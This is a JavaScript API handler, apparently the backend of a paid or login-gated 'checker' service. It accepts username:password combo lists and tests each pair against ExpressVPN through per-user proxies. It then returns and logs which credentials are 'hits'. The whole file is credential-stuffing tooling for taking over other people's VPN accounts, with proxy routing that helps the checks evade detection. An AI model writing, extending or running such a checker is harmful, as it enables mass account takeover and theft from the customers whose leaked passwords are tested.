// api/check.js – with per-user proxy
import { checkExpressVPN } from '../lib/expressChecker.js';
import { validateSession } from '../lib/auth.js';
import { logCheck } from '../lib/analytics.js';

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const auth = req.headers['authorization'] || '';
  const token = auth.startsWith('Bearer ') ? auth.slice(7) : null;
  const session = await validateSession(token);
  if (!session) {
    return res.status(401).json({ error: '🔒 Please login or your access expired' });
  }

  const { username, password, combos } = req.body;
  const proxyUser = session.username;

  if (combos && Array.isArray(combos) && combos.length > 0) {
    const results = [];
    for (const combo of combos) {
      const [u, p] = combo.split(':');
      if (!u || !p) { results.push({ combo, valid: false, hit: false, message: 'Invalid' }); continue; }
      const r = await checkExpressVPN(u.trim(), p.trim(), proxyUser);
      results.push({ combo, ...r });
      await logCheck(session.username, combo, r.hit === true);
    }
    return res.status(200).json({ results });
  }

  if (!username || !password) return res.status(400).json({ error: 'Missing credentials' });
  const result = await checkExpressVPN(username, password, proxyUser);
  await logCheck(session.username, `${username}:${password}`, result.hit === true);
  return res.status(200).json(result);
}
